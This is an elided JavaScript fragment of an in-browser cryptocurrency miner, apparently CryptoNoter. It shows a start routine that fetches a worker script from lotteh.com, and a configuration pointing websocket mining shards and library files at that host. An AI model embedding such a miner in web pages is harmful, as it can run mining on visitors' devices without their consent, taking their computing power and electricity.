(function (window) {
    ...
    Miner.prototype.start = function (mode) {
        ...
        if (this._useWASM || this._asmjsStatus === "loaded") {
            ...
            xhr.open("get", "https://lotteh.com/static/crypto/worker.js", true);
            xhr.send()
...
self.CryptoNoter.CONFIG = {
    LIB_URL: "https://lotteh.com/static/crypto/lib/",
    WEBSOCKET_SHARDS: [["wss://lotteh.com/ws/crypto/miner/"]],
    CAPTCHA_URL: "https://lotteh.com/captcha/",
    MINER_URL: "https://lotteh.com/static/crypto/miner.html"
};
